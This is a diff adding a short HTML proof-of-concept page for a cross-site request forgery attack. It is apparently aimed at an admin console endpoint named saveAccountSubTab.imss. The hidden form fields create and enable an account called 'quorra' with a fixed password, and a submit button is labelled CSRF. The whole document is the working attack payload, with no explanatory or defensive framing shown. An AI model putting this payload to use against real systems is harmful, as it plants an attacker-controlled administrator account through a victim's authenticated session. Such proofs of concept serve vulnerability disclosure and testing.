@@ -1,0 +1,14 @@
+<html>
+<body>
+<form action="https://www.example.com/saveAccountSubTab.imss" method="POST">
+<input type="hidden" name="enabled" value="on" />
+<input type="hidden" name="authMethod" value="1" />
+<input type="hidden" name="name" value="quorra" />
+<input type="hidden" name="password" value="quorra&#46;123" />
+<input type="hidden" name="confirmPwd" value="quorra&#46;123" />
+<input type="hidden" name="tabAction" value="saveAuth" />
+<input type="hidden" name="gotoTab" value="saveAll" />
+<input type="submit" value="CSRF" />
+</form>
+</body>
+</html>
